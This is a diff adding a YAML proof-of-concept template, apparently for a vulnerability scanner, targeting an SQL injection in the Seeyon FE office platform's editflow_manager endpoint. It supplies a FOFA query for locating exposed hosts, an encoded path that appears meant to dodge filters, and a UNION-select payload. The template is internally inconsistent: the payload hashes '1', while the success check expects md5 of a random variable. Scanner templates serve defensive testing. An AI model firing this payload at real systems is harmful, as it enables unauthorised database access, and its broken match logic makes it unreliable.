@@ -1,0 +1,20 @@
+id: poc-yaml-seeyon-hulian-fe-editflow-manager-sqli
+info:
+  name: 致远互联FE协作办公平台 editflow_manager SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 致远互联-FE
+  fofa: app="致远互联-FE"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /sysform/003/editflow_manager.j%73p
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: option=2&GUID=-1%27+union+select+sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))--+
+  expression: status_code == 200 && contains(body,"0x"+t2) && !contains(body,"<")
+    && contains(content_type,"text/html;charset=utf-8")
+transport: http
